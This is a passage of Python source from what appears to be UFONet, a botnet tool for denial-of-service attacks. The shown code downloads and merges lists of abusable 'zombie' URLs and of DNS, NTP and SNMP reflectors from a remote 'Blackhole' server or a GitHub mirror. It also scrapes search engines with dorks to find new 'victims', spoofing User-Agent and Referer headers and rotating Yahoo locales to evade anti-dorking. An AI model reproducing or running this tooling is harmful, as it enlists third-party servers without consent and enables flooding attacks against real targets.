            print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX READY!] ;-)")
        except:
            print("[AI] [Control] [Blackhole] [Server] Reply: [VORTEX FAILED!]")
            print('-'*12 + '\n')
            print("[Info] [AI] You can try to download [Zombies] from a different [Blackhole] [Server] (provided by someone!) with:\n\n ex: ufonet --down-from '<IP>'")
            print("\nOr/And from a [Blackhole] [GitHub] with:\n\n ex: ufonet --download-github")
            print('-'*12 + '\n')
            print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [Server] -> [Exiting!]\n")
            return
        print('-'*12 + '\n')
        f_in_abductions = gzip.open('botnet/abductions.txt.gz', 'rb')
        f_out_abductions = open('botnet/abductions.txt', 'wb')
        f_out_abductions.write(f_in_abductions.read())
        f_in_abductions.close()
        f_out_abductions.close()
        os.remove('botnet/abductions.txt.gz') # remove abductions .gz file
        f_in_troops = gzip.open('botnet/troops.txt.gz', 'rb')
        f_out_troops = open('botnet/troops.txt', 'wb')
        f_out_troops.write(f_in_troops.read())
        f_in_troops.close()
        f_out_troops.close()
        os.remove('botnet/troops.txt.gz') # remove troops .gz file
        f_in_robots = gzip.open('botnet/robots.txt.gz', 'rb')
        f_out_robots = open('botnet/robots.txt', 'wb')
        f_out_robots.write(f_in_robots.read())
        f_in_robots.close()
        f_out_robots.close()
        os.remove('botnet/robots.txt.gz') # remove robots .gz file
        f_in_drones = gzip.open('botnet/drones.txt.gz', 'rb')
        f_out_drones = open('botnet/drones.txt', 'wb')
        f_out_drones.write(f_in_drones.read())
        f_in_drones.close()
        f_out_drones.close()
        os.remove('botnet/drones.txt.gz') # remove drones .gz file
        f_in_reflectors = gzip.open('botnet/reflectors.txt.gz', 'rb')
        f_out_reflectors = open('botnet/reflectors.txt', 'wb')
        f_out_reflectors.write(f_in_reflectors.read())
        f_in_reflectors.close()
        f_out_reflectors.close()
        os.remove('botnet/reflectors.txt.gz') # remove reflectors .gz file
        f_in_crystals = gzip.open('botnet/crystals.txt.gz', 'rb')
        f_out_crystals = open('botnet/crystals.txt', 'wb')
        f_out_crystals.write(f_in_crystals.read())
        f_in_crystals.close()
        f_out_crystals.close()
        os.remove('botnet/crystals.txt.gz') # remove crystals .gz file
        f_in_warps = gzip.open('botnet/warps.txt.gz', 'rb')
        f_out_warps = open('botnet/warps.txt', 'wb')
        f_out_warps.write(f_in_warps.read())
        f_in_warps.close()
        f_out_warps.close()
        os.remove('botnet/warps.txt.gz') # remove warps .gz file
        f_in_bosons = gzip.open('botnet/bosons.txt.gz', 'rb')
        f_out_bosons = open('botnet/bosons.txt', 'wb')
        f_out_bosons.write(f_in_bosons.read())
        f_in_bosons.close()
        f_out_bosons.close()
        os.remove('botnet/bosons.txt.gz') # remove bosons .gz file
        num_abductions = 0
        with open('botnet/abductions.txt') as f:
            for _ in f:
                num_abductions = num_abductions + 1
        print("[Info] Zombies: " + str(num_abductions))
        num_robots = 0
        with open('botnet/robots.txt') as f:
            for _ in f:
                num_robots = num_robots + 1
        print("[Info] Droids : " + str(num_robots))
        num_troops = 0
        with open('botnet/troops.txt') as f:
            for _ in f:
                num_troops = num_troops + 1
        print("[Info] Aliens : " + str(num_troops))
        num_drones = 0
        with open('botnet/drones.txt') as f:
            for _ in f:
                num_drones = num_drones + 1
        print("[Info] UCAVs  : " + str(num_drones))
        num_reflectors = 0
        with open('botnet/reflectors.txt') as f:
            for _ in f:
                num_reflectors = num_reflectors + 1
        print("[Info] X-RPCs : " + str(num_reflectors))
        num_crystals = 0
        with open('botnet/crystals.txt') as f:
            for _ in f:
                num_crystals = num_crystals + 1
        print("[Info] DNSs   : " + str(num_crystals))
        num_warps = 0
        with open('botnet/warps.txt') as f:
            for _ in f:
                num_warps = num_warps + 1
        print("[Info] NTPs   : " + str(num_warps))
        num_bosons = 0
        with open('botnet/bosons.txt') as f:
            for _ in f:
                num_bosons = num_bosons + 1
        print("[Info] SNMPs  : " + str(num_bosons))
        total_zombies = num_abductions + num_troops + num_crystals + num_robots + num_drones + num_reflectors + num_warps + num_bosons
        print("\n[Info] [AI] Congratulations!. Total downloaded: " + str(total_zombies))
        print('-'*12)
        if not self.options.forceyes:
            update_reply = input("\n[AI] Do you want to merge ONLY the new 'troops' into your army? (Y/n)")
            print('-'*25)
        else:
            update_reply = "Y"
        if update_reply == "n" or update_reply == "N":
            os.remove('botnet/abductions.txt') # remove abductions file
            os.remove('botnet/troops.txt') # remove troops file
            os.remove('botnet/robots.txt') # remove robots file
            os.remove('botnet/drones.txt') # remove drones file
            os.remove('botnet/reflectors.txt') # remove reflectors file
            os.remove('botnet/crystals.txt') # remove crystals file
            os.remove('botnet/warps.txt') # remove warps file
            os.remove('botnet/bosons.txt') # remove bosons file
            print("\n[Info] [AI] [Control] Temporal list downloaded has been removed! -> [Exiting!]")
            print('-'*25)
            print("\n[AI] "+self.exit_msg+"\n")
        else:
            zombies_ready = []
            f = open('botnet/abductions.txt')
            abductions = f.readlines()
            f.close()
            fz = open(self.zombies_file)
            zombies = fz.readlines()
            fz.close()
            for abduction in abductions:
                abduction = abduction.replace('\n','') 
                if abduction not in zombies:
                    zombies_ready.append(abduction)
                else:
                    pass
            self.update_zombies(zombies_ready)
            os.remove('botnet/abductions.txt') # remove abductions .txt file
            aliens_ready = []
            f = open('botnet/troops.txt')
            troops = f.readlines()
            f.close()
            fz = open(self.aliens_file)
            aliens = fz.readlines()
            fz.close()
            for alien in troops:
                alien = alien.replace('\n','')
                if alien not in aliens:
                    aliens_ready.append(alien)
                else:
                    pass
            self.update_aliens(aliens_ready)
            os.remove('botnet/troops.txt') # remove troops .txt file
            droids_ready = []
            f = open('botnet/robots.txt')
            robots = f.readlines()
            f.close()
            fz = open(self.droids_file)
            droids = fz.readlines()
            fz.close()
            for droid in robots:
                droid = droid.replace('\n','')
                if droid not in droids:
                    droids_ready.append(droid)
                else:
                    pass
            self.update_droids(droids_ready)
            os.remove('botnet/robots.txt') # remove robots .txt file
            ucavs_ready = []
            f = open('botnet/drones.txt')
            drones = f.readlines()
            f.close()
            fz = open(self.ucavs_file)
            ucavs = fz.readlines()
            fz.close()
            for drone in drones:
                drone = drone.replace('\n','')
                if drone not in ucavs:
                    ucavs_ready.append(drone)
                else:
                    pass
            self.update_ucavs(ucavs_ready)
            os.remove('botnet/drones.txt') # remove drones .txt file
            rpcs_ready = []
            f = open('botnet/reflectors.txt')
            reflectors = f.readlines()
            f.close()
            fz = open(self.rpcs_file)
            rpcs = fz.readlines()
            fz.close()
            for reflector in reflectors:
                reflector = reflector.replace('\n','')
                if reflector not in rpcs:
                    rpcs_ready.append(reflector)
                else:
                    pass
            self.update_rpcs(rpcs_ready)
            os.remove('botnet/reflectors.txt') # remove reflectors .txt file
            dnss_ready = []
            f = open('botnet/crystals.txt')
            crystals = f.readlines()
            f.close()
            fz = open(self.dnss_file)
            dnss = fz.readlines()
            fz.close()
            for crystal in crystals:
                crystal = crystal.replace('\n','')
                if crystal not in dnss:
                    dnss_ready.append(crystal)
                else:
                    pass
            self.update_dnss(dnss_ready)
            os.remove('botnet/crystals.txt') # remove crystals .txt file
            ntps_ready = []
            f = open('botnet/warps.txt')
            warps = f.readlines()
            f.close()
            fz = open(self.ntps_file)
            ntps = fz.readlines()
            fz.close()
            for warp in warps:
                warp = warp.replace('\n','')
                if warp not in ntps:
                    ntps_ready.append(warp)
                else:
                    pass
            self.update_ntps(ntps_ready)
            os.remove('botnet/warps.txt') # remove warps .txt file
            snmps_ready = []
            f = open('botnet/bosons.txt')
            bosons = f.readlines()
            f.close()
            fz = open(self.snmps_file)
            snmps = fz.readlines()
            fz.close()
            for boson in bosons:
                boson = boson.replace('\n','')
                if boson not in snmps:
                    snmps_ready.append(boson)
                else:
                    pass
            self.update_snmps(snmps_ready)
            os.remove('botnet/bosons.txt') # remove bosons .txt file
            print("\n[Info] [AI] Botnet updated! -> ;-)")
            self.update_transferred_stats(self.trans_zombies) # update json file with transferred stats (blackhole)
            if not self.options.forceyes: # ask for update everything
                print('-'*25 + "\n")
                update_reply = input("[AI] You would also like to update other content: [News] [Missions] [Grid] [Board]... (Y/n)")
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                print("\n[AI] "+self.exit_msg+"\n")
                return
            else:
                try:
                    update_gui = self.update_gui_data() # update GUI data
                except:
                    print('-'*25 +"\n")
                    print("[Error] [AI] Something wrong downloading GUI content! -> [Aborting!]")
                    print('-'*25)
                    print("\n[AI] "+self.exit_msg+"\n")
                    return

    def downloading_github_list(self): 
        # add your mirror to protect/share/distribute... [Zombies]
        try:
            print(("[AI] Trying [Blackhole] [GitHub]: "+self.github_zombies+"\n"))
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if self.options.timeout: # set timeout
                try:
                    timeout = int(self.options.timeout)
                except:
                    timeout = 5
            else:
                timeout = 5
            if timeout < 1:
                timeout = 5 
            if self.options.proxy: # set proxy
                self.proxy_transport(self.options.proxy)
            try:
                req = urllib.request.Request(self.github_zombies+'zombies.txt', None, headers)
                zombies_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                zombies_reply = ""
            try:
                req = urllib.request.Request(self.github_zombies+'aliens.txt', None, headers)
                aliens_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                aliens_reply = ""
            try:
                req = urllib.request.Request(self.github_zombies+'dns.txt', None, headers)
                dns_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                dns_reply = ""
            try:
                req = urllib.request.Request(self.github_zombies+'droids.txt', None, headers)
                droids_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                droids_reply = ""
            try:
                req = urllib.request.Request(self.github_zombies+'rpcs.txt', None, headers)
                rpcs_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                rpcs_reply = ""
            try:
                req = urllib.request.Request(self.github_zombies+'ucavs.txt', None, headers)
                ucavs_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                ucavs_reply = ""
            try:
                req = urllib.request.Request(self.github_zombies+'ntp.txt', None, headers)
                ntp_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                ntp_reply = ""
            try:
                req = urllib.request.Request(self.github_zombies+'snmp.txt', None, headers)
                snmp_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            except:
                snmp_reply = ""
            if zombies_reply == "" and aliens_reply == "" and dns_reply == "" and droids_reply == "" and rpcs_reply == "" and ucavs_reply == "" and ntp_reply == "" and snmp_reply == "":
                print("[AI] [Control] [Blackhole] [GitHub] Reply: [VORTEX FAILED!]")
                print('-'*12 + '\n')
                print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [GitHub] -> [Exiting!]\n")
                return
            f = open('botnet/abductions.txt', 'w') # zombies
            f.write(zombies_reply)
            f.close()
            f = open('botnet/troops.txt', 'w') # aliens
            f.write(aliens_reply)
            f.close()
            f = open('botnet/crystals.txt', 'w') # dns
            f.write(dns_reply)
            f.close()
            f = open('botnet/robots.txt', 'w')  # droids
            f.write(droids_reply)
            f.close()
            f = open('botnet/drones.txt', 'w') # ucavs
            f.write(ucavs_reply)
            f.close()
            f = open('botnet/reflectors.txt', 'w') # rpcs
            f.write(rpcs_reply)
            f.close()
            f = open('botnet/warps.txt', 'w') # ntp
            f.write(ntp_reply)
            f.close()
            f = open('botnet/bosons.txt', 'w') # snmp
            f.write(snmp_reply)
            f.close()
            print("[AI] [Control] [Blackhole] [GitHub] Reply: [VORTEX READY!] ;-)")
        except:
            print("[AI] [Control] [Blackhole] [GitHub] Reply: [VORTEX FAILED!]")
            print('-'*12 + '\n')
            print("[Error] [AI] Unable to download list of [Zombies] from this [Blackhole] [GitHub] -> [Exiting!]\n")
            return
        print('-'*12 + '\n')
        num_abductions = 0
        with open('botnet/abductions.txt') as f: # zombies
            for _ in f:
                num_abductions = num_abductions + 1
        print("[Info] Zombies: " + str(num_abductions))      
        num_troops = 0
        with open('botnet/troops.txt') as f: # aliens
            for _ in f:
                num_troops = num_troops + 1
        print("[Info] Aliens : " + str(num_troops))
        num_robots = 0
        with open('botnet/robots.txt') as f: # droids
            for _ in f:
                num_robots = num_robots + 1
        print("[Info] Droids : " + str(num_robots))
        num_drones = 0
        with open('botnet/drones.txt') as f: # ucavs
            for _ in f:
                num_drones = num_drones + 1
        print("[Info] UCAVs  : " + str(num_drones))
        num_reflectors = 0
        with open('botnet/reflectors.txt') as f: # rpcs
            for _ in f:
                num_reflectors = num_reflectors + 1
        print("[Info] X-RPCs : " + str(num_reflectors))
        num_crystals = 0
        with open('botnet/crystals.txt') as f: # dns
            for _ in f:
                num_crystals = num_crystals + 1
        print("[Info] DNSs   : " + str(num_crystals))
        num_warps = 0
        with open('botnet/warps.txt') as f: # ntp
            for _ in f:
                num_warps = num_warps + 1
        print("[Info] NTPs   : " + str(num_warps))
        num_bosons = 0
        with open('botnet/bosons.txt') as f: # snmp
            for _ in f:
                num_bosons = num_bosons + 1
        print("[Info] SNMPs  : " + str(num_bosons))
        total_zombies = num_abductions + num_troops + num_crystals + num_robots + num_drones + num_reflectors + num_warps + num_bosons
        print("\n[Info] [AI] Congratulations!. Total downloaded: " + str(total_zombies))
        print('-'*12)
        if not self.options.forceyes:
            update_reply = input("\n[AI] Do you want to merge ONLY the new 'troops' into your army? (Y/n)")
            print('-'*25)
        else:
            update_reply = "Y"
        if update_reply == "n" or update_reply == "N":
            os.remove('botnet/abductions.txt') # remove zombies/abductions file
            os.remove('botnet/troops.txt') # remove aliens/troops file
            os.remove('botnet/crystals.txt') # remove dns/crystals file
            os.remove('botnet/robots.txt') # remove droids/robots file
            os.remove('botnet/drones.txt') # remove ucavs/drones file
            os.remove('botnet/reflectors.txt') # remove rpcs/reflectors file
            os.remove('botnet/warps.txt') # remove ntp/warps file
            os.remove('botnet/bosons.txt') # remove snmp/bosons file
            print("\n[Info] [AI] [Control] Temporal list downloaded has been removed! -> [Exiting!]")
            print('-'*25)
            print("\n[AI] "+self.exit_msg+"\n")
        else:
            zombies_ready = []
            f = open('botnet/abductions.txt')
            abductions = f.readlines()
            f.close()
            fz = open(self.zombies_file)
            zombies = fz.readlines()
            fz.close()
            for abduction in abductions:
                abduction = abduction.replace('\n','') 
                if abduction not in zombies:
                    zombies_ready.append(abduction)
                else:
                    pass
            self.update_zombies(zombies_ready)
            os.remove('botnet/abductions.txt') # remove zombies/abductions file
            aliens_ready = []
            f = open('botnet/troops.txt')
            troops = f.readlines()
            f.close()
            fz = open(self.aliens_file)
            aliens = fz.readlines()
            fz.close()
            for alien in troops:
                alien = alien.replace('\n','')
                if alien not in aliens:
                    aliens_ready.append(alien)
                else:
                    pass
            self.update_aliens(aliens_ready)
            os.remove('botnet/troops.txt') # remove aliens/troops file
            dnss_ready = []
            f = open('botnet/crystals.txt')
            crystals = f.readlines()
            f.close()
            fz = open(self.dnss_file)
            dnss = fz.readlines()
            fz.close()
            for crystal in crystals:
                crystal = crystal.replace('\n','')
                if crystal not in dnss:
                    dnss_ready.append(crystal)
                else:
                    pass
            self.update_dnss(dnss_ready)
            os.remove('botnet/crystals.txt') # remove dns/crystals file
            droids_ready = []
            f = open('botnet/robots.txt')
            robots = f.readlines()
            f.close()
            fz = open(self.droids_file)
            droids = fz.readlines()
            fz.close()
            for droid in robots:
                droid = droid.replace('\n','')
                if droid not in droids:
                    droids_ready.append(droid)
                else:
                    pass
            self.update_droids(droids_ready)
            os.remove('botnet/robots.txt') # remove droids/robots file
            ucavs_ready = []
            f = open('botnet/drones.txt')
            drones = f.readlines()
            f.close()
            fz = open(self.ucavs_file)
            ucavs = fz.readlines()
            fz.close()
            for drone in drones:
                drone = drone.replace('\n','')
                if drone not in ucavs:
                    ucavs_ready.append(drone)
                else:
                    pass
            self.update_ucavs(ucavs_ready)
            os.remove('botnet/drones.txt') # remove UCAVs/drones file
            rpcs_ready = []
            f = open('botnet/reflectors.txt')
            reflectors = f.readlines()
            f.close()
            fz = open(self.rpcs_file)
            rpcs = fz.readlines()
            fz.close()
            for reflector in reflectors:
                reflector = reflector.replace('\n','')
                if reflector not in rpcs:
                    rpcs_ready.append(reflector)
                else:
                    pass
            self.update_rpcs(rpcs_ready)
            os.remove('botnet/reflectors.txt') # remove RPCs/reflectors file
            ntps_ready = []
            f = open('botnet/warps.txt')
            warps = f.readlines()
            f.close()
            fz = open(self.ntps_file)
            ntps = fz.readlines()
            fz.close()
            for warp in warps:
                warp = warp.replace('\n','')
                if warp not in ntps:
                    ntps_ready.append(warp)
                else:
                    pass
            self.update_ntps(ntps_ready)
            os.remove('botnet/warps.txt') # remove NTP/warps file
            snmps_ready = []
            f = open('botnet/bosons.txt')
            bosons = f.readlines()
            f.close()
            fz = open(self.snmps_file)
            snmps = fz.readlines()
            fz.close()
            for boson in bosons:
                boson = boson.replace('\n','')
                if boson not in snmps:
                    snmps_ready.append(boson)
                else:
                    pass
            self.update_snmps(snmps_ready)
            os.remove('botnet/bosons.txt') # remove SNMP/bosons file
            print("\n[Info] [AI] Botnet updated! -> ;-)")
            self.update_transferred_stats(self.trans_zombies) # update json file with transferred stats (blackhole)
            if not self.options.forceyes: # ask for update everything
                print('-'*25 + "\n")
                update_reply = input("[AI] You would also like to update other content: [News] [Missions] [Grid] [Board]... (Y/n)")
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                print("\n[AI] "+self.exit_msg+"\n")
                return
            else:
                try:
                    update_gui = self.update_gui_data() # update GUI data
                except:
                    print('-'*25 +"\n")
                    print("[Error] [AI] Something wrong downloading GUI content! -> [Aborting!]")
                    print('-'*25)
                    print("\n[AI] "+self.exit_msg+"\n")
                    return

    def uploading_github_list(self):
        print(" 0. Set a different URL (if required) for code repository sources:\n\n [current: "+self.github_zombies+"]\n")
        print(" 1. Test your 'zombies' to upload only those that really work (ex: ufonet --test-all).")
        print(" 2. Make a -PULL REQUEST- to the owner of the code repository.")
        print(" 3. Share your updates in the #UFONet 'motherships'...\n")
        print('='*22 + '\n')
        print("[AI] "+self.exit_msg+"\n")

    def create_web_interface(self):
        # launch webserver+gui
        from .webgui import ClientThread
        import webbrowser
        host = '0.0.0.0'
        port = 9999
        try: 
            webbrowser.open('http://127.0.0.1:9999', new=1)
            tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tcpsock.bind((host,port))
            while True:
                tcpsock.listen(4)
                (clientsock, (ip, port)) = tcpsock.accept()
                newthread = ClientThread(ip, port, clientsock)
                newthread.start()
        except (KeyboardInterrupt, SystemExit):
            sys.exit()

    def extract_dorks(self):
        # extract dorks from file (ex: 'dorks.txt')
        try:
            f = open(self.dorks_file)
            dorks = f.readlines()
            dorks = [ dork.replace('\n','') for dork in dorks ]
            f.close()
            if not dorks:
                if not options.autosearch:
                    print("[Error] [AI] [Control] Cannot retrieve [Dorks] from: 'botnet/dorks.txt' -> [Aborting!]\n")
                return
            else:
                return dorks
        except:
            if not options.autosearch:
                if os.path.exists(self.dorks_file) == True:
                    print("[Error] [AI] [Control] Cannot open [Dorks] from: 'botnet/dorks.txt' -> [Aborting!]\n")
                    return #sys.exit(2)
                else:
                    print("[Error] [AI] [Control] Cannot found [Dorks] from: 'botnet/dorks.txt' -> [Aborting!]\n")
                    return #sys.exit(2)
            else:
                return

    def search_zombies(self, dork, zombies_found):
        # crawlering on search engine results to extract zombies
        options = self.options
        zombies = []
        if not options.engine: # default search engine
            options.engine = 'duck'
        if options.engine == 'bing': # using bing [28/02/2019: OK!]
            url = 'https://www.bing.com/search?'
            if options.search: # search from query
                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks or options.autosearch: # search from a dork
                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'q':q, 'first':start }
            data = urllib.parse.urlencode(query_string)
            url = url + data
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("[Info] [AI] Query used: " + url)
                print("\n" + '-'*44 + '\n')
            try:
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                req = urllib.request.Request(url, None, headers)
                req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
            except:
                print('[Error] [AI] Unable to connect to: bing\n')
                if options.allengines or options.autosearch:
                    return
                if not options.dorks or not options.autosearch:
                    if not self.options.forceyes:
                        update_reply = input("[AI] Do you want to try a different search engine? (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print("\nSearch engines available:")
                    print('-'*25)
                    for e in self.search_engines:
                        print("+ "+e)
                    print('-'*25)
                    print("\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'")
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)
        elif options.engine == 'yahoo': # yahoo [28/02/2019: OK!]
            location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # evading Yahoo anti-dorking [grey magic: 28/02/2019]
            #location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
            location = str(random.choice(location).strip()) # shuffle location
            if location == "jp": # [28/02/2019]
                url = 'https://search.yahoo.co.jp/search?'
            else:
                url = 'https://'+location+'.search.yahoo.com/search?'            
            if options.search: # search from query
                if location == "jp":
                    q = '"' + str(options.search) + '"' # set query to search literally on results
                else:
                    q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks or options.autosearch: # search from a dork
                if location == "jp":
                    q = '"' + str(dork) + '"' # set query to search literally on results
                else:
                    q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'p':q, 'b':start }
            data = urllib.parse.urlencode(query_string)
            url = url + data
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print(("Query used: " + url + "\n"))
            try:
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                req = urllib.request.Request(url, None, headers)
                req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
            except:
                print('[Error] [AI] Unable to connect to: yahoo\n')
                if options.allengines or options.autosearch:
                    return
                if not options.dorks or not options.autosearch:
                    if not self.options.forceyes:
                        update_reply = input("[AI] Do you want to try a different search engine? (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print("\nSearch engines available:")
                    print('-'*25)
                    for e in self.search_engines:
                        print("+ "+e)
                    print('-'*25)
                    print("\nEx: ufonet -s 'proxy.php?url=' --se 'bing'")
                    return #sys.exit(2)
                else:
                    req_reply = ''
            #regex = '<h3 class="title"><a style="color:#2C46C7" class=" td-u" href="(.+?)" target="_blank"' # regex magics [18/08/2016]
            regex = 'href="(.+?)" target="_blank" data' # regex magics [08/04/2017]
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)
        elif options.engine == 'duck': # using duckduckgo [28/02/2019: OK!]
            url = 'https://duckduckgo.com/html/'
            if options.search: # search from query
                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks or options.autosearch: # search from a dork
                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
            query_string = { 'q':q }
            data = urllib.parse.urlencode(query_string)
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + " (POST: "+ data + ")\n")
            try:
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                req = urllib.request.Request(url, data.encode('utf-8'), headers) # HTTP POST request
                req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
            except:
                print('[Error] [AI] Unable to connect to: duck\n')
                if options.allengines or options.autosearch:
                    return
                if not options.dorks or not options.autosearch:
                    if not self.options.forceyes:
                        update_reply = input("[AI] Do you want to try a different search engine? (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print("\nSearch engines available:")
                    print('-'*25)
                    for e in self.search_engines:
                        print("+ "+e)
                    print('-'*25)
                    print("\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'")
                    return #sys.exit(2)
                else:
                    req_reply = ''
            regex = 'snippet" href="(.+?)">' # regex magics
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)
        else: # no valid search engine
            print('[Error] [AI] This search engine is not supported!\n')
            if not options.dorks or options.autosearch:
                if not self.options.forceyes:
                    update_reply = input("[AI] Do you want to try a different search engine? (Y/n)")
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    return #sys.exit(2)
                print("\nSearch engines available:")
                print('-'*25)
                for e in self.search_engines:
                    print("+ "+e)
                print('-'*25)
                print("\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'")
                return #sys.exit(2)
            else:
                req_reply = ''
        if options.num_results: # set number of results to search
            try:
                num = int(options.num_results)
            except:
                print("[Info] [AI] You should specify an integer!... Using default value: 10\n")
                num = 10
        else:
            num = 10
        total_results = 1
        for url in url_links: # general parse on urls
            if int(num) < int(total_results):
                break
            if options.engine == "bing":
                if " h=" in url: # regex magics [18/08/2016]
                    url = url.rsplit('" h=',1)[0]
            if options.engine == "yahoo":
                if 'RU=' in url: # regex magics [18/08/2016]
                    url = url.rsplit('RU=',1)[1] 
                if 'UTF-8&u=' in url: # regex magics [05/02/2018]
                    url = url.rsplit('UTF-8&u=',1)[1]  
            total_results = total_results + 1 # results counter
            url_link = urllib.parse.unquote(url) # unquote encoding
            if options.search:
                sep = str(options.search)
            if options.dorks or options.autosearch:
                sep = str(dork)
            url_link = url_link.rsplit(sep, 1)[0] + sep
            if 'href="' in url_link:
                url_link = url_link.rsplit('href="', 1)[1]
            if "instreamset" in url_link: # invalid zombie
                url_link = "" # discarded
            if '" ' in url_link:
                url_link = url_link.rsplit('" ', 1)[1]
            if options.engine in url_link:
                url_link = "" # discarded
            if 'http' not in url_link:
                url_link = "" # discarded
            else:
                if url_link not in zombies and url_link+os.linesep not in zombies_found and url_link is not "": # AI mode (parsing search engines mixed pool and stored army)
                    print('+Victim found: ' + url_link)
                    print('-'*12)
                    zombies.append(url_link)
                else:
                    pass
        if len(zombies) == 0: # print dorking results
            print("[Info] [AI] NOT any NEW victim(s) found for this query!")
            if not options.dorks:
                if not options.autosearch:
                    if not self.options.forceyes:
                        return #sys.exit(2)
        print("\n" + '-'*44 + '\n')
        self.total_possible_zombies = self.total_possible_zombies + len(zombies)
        return zombies

    def check_nat(self):
        # check for NAT configuration
        options = self.options
        tor_reply = urllib.request.urlopen(self.check_tor_url).read().decode('utf-8') # check if TOR is enabled
        your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
        check_ip_service = None
        if not tor_reply or 'Congratulations' not in tor_reply:
            print("[Info] [AI] It seems that you are not using TOR to recieve data. -> [OK!]\n")
        else:
            print("[Error] [AI] You are using TOR as public IP... It's not possible to NAT! -> [Aborting!]\n")
            self.nat_error_flag = "ON"
            return #sys.exit(2)
        try:
            data = str(urlopen(self.check_ip_service1).read()) # check for public ip
            self.pub_ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
            check_ip_service = self.check_ip_service1
        except:
            try: # another check for public ip
                data = str(urlopen(self.check_ip_service2).read())
                self.pub_ip = re.compile(r'">(\d+\.\d+\.\d+\.\d+)</span>').search(data).group(1)
                check_ip_service = self.check_ip_service2
            except:
                print("[Error] [AI] Something wrong checking your public IP! -> [Exiting!]\n")
                self.nat_error_flag = "ON"
                return
        t = urlparse(check_ip_service)
        name_service = t.netloc
        print(" + Public: " + self.pub_ip + " | "+name_service+"\n")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 0))  # connecting to a UDP address doesn't send packets (black magic)
        self.local_ip = s.getsockname()[0]
        print(" + Local: " + self.local_ip + "\n")
        print('='*22 + '\n')

    def extract_ucavs(self):
        # extract ucavs from file
        options = self.options
        try:
            f = open(self.ucavs_file)
            ucavs = f.readlines()
            ucavs = [ ucav.replace('\n','') for ucav in ucavs ]
            f.close()
            if not ucavs:
                print("[Info] [AI] [Control] Cannot retrieve [UCAVs] from: 'botnet/ucavs.txt' -> [Discarding!]")
                self.options.disableucavs = True
                return
            else:
                return ucavs
        except:
            if os.path.exists(self.ucavs_file) == True:
                print("[Info] [AI] [Control] Cannot open [UCAVs] from: 'botnet/ucavs.txt' -> [Discarding!]")
                return #sys.exit(2)
            else:
                print("[Info] [AI] [Control] Cannot found [UCAVs] from: 'botnet/ucavs.txt' -> [Discarding!]")
                return #sys.exit(2)

    def discarding_ucavs(self, ucav, ucavs):
        if ucav in self.discard_ucavs:
            ucavs.remove(ucav)
            if self.options.verbose:
                print(("[Info] [AI] [Control] [UCAVs] "+str(ucav)+" is not working! -> [Discarding!]"))
            self.ucavs_fail = self.ucavs_fail + 1 # add ucav fail to stats
        return ucavs

    def send_ucavs(self, ucavs):
